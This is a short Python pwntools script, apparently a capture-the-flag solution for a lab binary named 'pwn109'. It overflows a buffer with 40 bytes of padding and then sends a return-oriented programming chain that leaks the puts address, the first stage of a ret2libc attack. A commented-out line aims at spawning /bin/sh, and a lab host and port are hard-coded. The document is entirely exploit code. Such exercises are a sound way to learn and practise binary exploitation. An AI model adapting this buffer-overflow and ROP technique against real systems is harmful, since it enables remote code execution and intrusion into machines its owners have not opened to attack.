#
from pwn import *

host  = '10.10.173.60' 
port = 9009
exe = 'pwn109-1644300507645.pwn109'
elf = ELF(exe)
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

# rop.call(system,b'/bin/sh\x00')
print(elf.got['puts'])
rop.call(elf.plt['puts'],[next(elf.search(b"puts"))])

context.binary = elf
context.log_level = "debug"
# p = remote(host, port)

p = process(exe)
p.recvuntil(b'')
p.sendline(b'A'*40  + rop.chain())
p.interactive()